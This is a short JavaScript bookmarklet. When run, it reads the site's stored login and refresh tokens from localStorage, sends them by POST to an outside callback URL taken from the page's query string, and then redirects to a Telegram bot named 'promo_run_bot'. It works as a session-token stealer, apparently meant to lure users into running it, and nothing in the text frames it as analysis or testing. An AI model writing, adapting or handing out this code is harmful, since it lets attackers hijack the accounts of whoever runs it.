javascript:(async()=>{
  const cb = new URLSearchParams(location.search).get('tg_callback');
  if(!cb) return alert("Callback not found");

  const t = localStorage.getItem('auth-token');
  const r = localStorage.getItem('auth-refresh-token');

  if(!t || !r) return alert("Not logged in");

  await fetch(cb,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({token:t,refresh:r})
  });

  location.href="tg://resolve?domain=promo_run_bot";
})();
